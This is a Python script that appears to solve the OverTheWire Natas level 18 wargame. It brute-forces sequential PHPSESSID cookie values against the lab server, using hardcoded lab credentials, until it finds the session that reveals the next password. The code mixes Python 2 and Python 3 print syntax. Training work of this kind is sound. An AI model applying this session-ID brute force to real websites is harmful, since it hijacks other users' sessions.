import requests
import re

target = 'http://natas18.natas.labs.overthewire.org/index.php?debug=1'
user_auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

#payload = {"PHPSESSID":"100"}

for i in range(1,640):

    response = requests.get(target, auth = user_auth, 
        cookies = {"PHPSESSID":str(i)})
    result = re.search('Password:.+</pre>', response.text)
    #print result
    if result == None:
        print("PHPSESSID: " + str(i) + " unsuccessful"),
        #print response.text
        match = re.search('DEBUG.+<br>', response.text)
        print(match.group(0))
    else:
        print "success!"
        print result.group(0)
	print response.text
        break
    
        

#print response.text
